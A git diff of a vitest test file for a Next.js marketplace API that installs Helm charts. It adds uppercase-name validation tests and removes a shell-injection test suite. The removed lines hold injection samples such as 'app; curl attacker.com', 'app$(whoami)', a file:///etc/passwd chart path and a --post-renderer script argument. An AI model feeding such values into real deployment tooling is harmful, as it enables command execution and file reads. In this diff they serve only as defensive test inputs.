@@ -1,6 +1,5 @@
 import { describe, it, expect, beforeEach, vi } from 'vitest';
 import { NextRequest } from 'next/server';
-import { EventEmitter } from 'events';
 
 const { mockSpawn } = vi.hoisted(() => {
   const mockSpawn = vi.fn();
@@ -304,6 +303,47 @@ describe('POST /api/marketplace/[id]/install', () => {
 
     expect(data.status).toBe('installed');
   });
+
+  it('should reject invalid helmReleaseName', async () => {
+    mockGetRawMarketplaceItemById.mockResolvedValueOnce({
+      ...baseItem,
+      ark: {
+        helmReleaseName: 'INVALID-NAME', // uppercase not allowed
+        chartPath: 'oci://example.com/chart',
+      },
+    });
+
+    const request = createRequest('http://localhost/api/marketplace/invalid/install', {
+      method: 'POST',
+      body: JSON.stringify({ mode: 'command' }),
+    });
+    const response = await POST(request, { params: Promise.resolve({ id: 'invalid' }) });
+    const data = await response.json();
+
+    expect(response.status).toBe(400);
+    expect(data.error).toContain('Validation failed');
+  });
+
+  it('should reject invalid namespace', async () => {
+    mockGetRawMarketplaceItemById.mockResolvedValueOnce({
+      ...baseItem,
+      ark: {
+        helmReleaseName: 'phoenix',
+        chartPath: 'oci://example.com/chart',
+        namespace: 'INVALID-NS', // uppercase not allowed
+      },
+    });
+
+    const request = createRequest('http://localhost/api/marketplace/invalid/install', {
+      method: 'POST',
+      body: JSON.stringify({ mode: 'command' }),
+    });
+    const response = await POST(request, { params: Promise.resolve({ id: 'invalid' }) });
+    const data = await response.json();
+
+    expect(response.status).toBe(400);
+    expect(data.error).toContain('Validation failed');
+  });
 });
 
 describe('DELETE /api/marketplace/[id]/install', () => {
@@ -442,233 +482,42 @@ describe('DELETE /api/marketplace/[id]/install', () => {
 
     expect(data.status).toBe('uninstalled');
   });
-});
 
-describe('SECURITY: Shell Injection Prevention', () => {
-  beforeEach(() => {
-    vi.clearAllMocks();
+  it('should reject invalid helmReleaseName', async () => {
+    mockGetRawMarketplaceItemById.mockResolvedValueOnce({
+      ...baseItem,
+      ark: {
+        helmReleaseName: 'INVALID-NAME', // uppercase not allowed
+        chartPath: 'oci://example.com/chart',
+      },
+    });
+
+    const request = createRequest('http://localhost/api/marketplace/invalid/install', {
+      method: 'DELETE',
+    });
+    const response = await DELETE(request, { params: Promise.resolve({ id: 'invalid' }) });
+    const data = await response.json();
+
+    expect(response.status).toBe(400);
+    expect(data.error).toContain('Validation failed');
   });
 
-  describe('helmReleaseName validation', () => {
-    it('should reject helmReleaseName with semicolon', async () => {
-      const malicious = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'app; curl attacker.com',
-          chartPath: 'oci://example.com/chart',
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(malicious);
-
-      const request = createRequest('http://localhost/api/marketplace/evil/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'evil' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(400);
-      expect(data.error).toContain('Validation failed');
+  it('should reject invalid namespace', async () => {
+    mockGetRawMarketplaceItemById.mockResolvedValueOnce({
+      ...baseItem,
+      ark: {
+        helmReleaseName: 'phoenix',
+        namespace: 'INVALID-NS', // uppercase not allowed
+      },
     });
 
-    it('should reject helmReleaseName with command substitution', async () => {
-      const malicious = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'app$(whoami)',
-          chartPath: 'oci://example.com/chart',
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(malicious);
-
-      const request = createRequest('http://localhost/api/marketplace/evil/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'evil' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(400);
-      expect(data.error).toContain('Validation failed');
+    const request = createRequest('http://localhost/api/marketplace/invalid/install', {
+      method: 'DELETE',
     });
+    const response = await DELETE(request, { params: Promise.resolve({ id: 'invalid' }) });
+    const data = await response.json();
 
-    it('should reject helmReleaseName exceeding 53 characters', async () => {
-      const malicious = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'a'.repeat(54),
-          chartPath: 'oci://example.com/chart',
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(malicious);
-
-      const request = createRequest('http://localhost/api/marketplace/evil/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'evil' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(400);
-      expect(data.error).toContain('53 characters');
-    });
-  });
-
-  describe('namespace validation', () => {
-    it('should reject namespace with semicolon', async () => {
-      const malicious = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'app',
-          chartPath: 'oci://example.com/chart',
-          namespace: 'default; curl attacker.com',
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(malicious);
-
-      const request = createRequest('http://localhost/api/marketplace/evil/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'evil' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(400);
-      expect(data.error).toContain('Validation failed');
-    });
-  });
-
-  describe('chartPath validation', () => {
-    it('should reject file:// scheme', async () => {
-      const malicious = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'app',
-          chartPath: 'file:///etc/passwd',
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(malicious);
-
-      const request = createRequest('http://localhost/api/marketplace/evil/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'evil' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(400);
-      expect(data.error).toContain('Validation failed');
-    });
-  });
-
-  describe('installArgs validation', () => {
-    it('should reject --post-renderer flag', async () => {
-      const malicious = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'app',
-          chartPath: 'oci://example.com/chart',
-          installArgs: ['--post-renderer', '/tmp/evil.sh'],
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(malicious);
-
-      const request = createRequest('http://localhost/api/marketplace/evil/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'evil' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(400);
-      expect(data.error).toContain('Disallowed install argument');
-    });
-
-    it('should reject mixed valid and invalid args', async () => {
-      const malicious = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'app',
-          chartPath: 'oci://example.com/chart',
-          installArgs: ['--create-namespace', '--wait', '--post-renderer', '/tmp/evil.sh'],
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(malicious);
-
-      const request = createRequest('http://localhost/api/marketplace/evil/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'evil' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(400);
-      expect(data.error).toContain('Disallowed install argument');
-    });
-
-    it('should accept empty installArgs array', async () => {
-      const valid = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'app',
-          chartPath: 'oci://example.com/chart',
-          installArgs: [],
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(valid);
-
-      const request = createRequest('http://localhost/api/marketplace/valid/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'valid' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(200);
-      expect(data.status).toBe('command');
-    });
-
-    it('should accept undefined installArgs', async () => {
-      const valid = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'app',
-          chartPath: 'oci://example.com/chart',
-          installArgs: undefined,
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(valid);
-
-      const request = createRequest('http://localhost/api/marketplace/valid/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'valid' }) });
-      const data = await response.json();
-
-      expect(response.status).toBe(200);
-      expect(data.status).toBe('command');
-    });
-  });
-
-  describe('valid inputs should pass', () => {
-    it('should accept valid Helm release name', async () => {
-      const valid = {
-        ...baseItem,
-        ark: {
-          helmReleaseName: 'my-app-123',
-          chartPath: 'oci://ghcr.io/example/chart',
-        },
-      };
-      mockGetRawMarketplaceItemById.mockResolvedValueOnce(valid);
-
-      const request = createRequest('http://localhost/api/marketplace/valid/install', {
-        method: 'POST',
-        body: JSON.stringify({ mode: 'command' }),
-      });
-      const response = await POST(request, { params: Promise.resolve({ id: 'valid' }) });
-
-      expect(response.status).toBe(200);
-    });
+    expect(response.status).toBe(400);
+    expect(data.error).toContain('Validation failed');
   });
 });
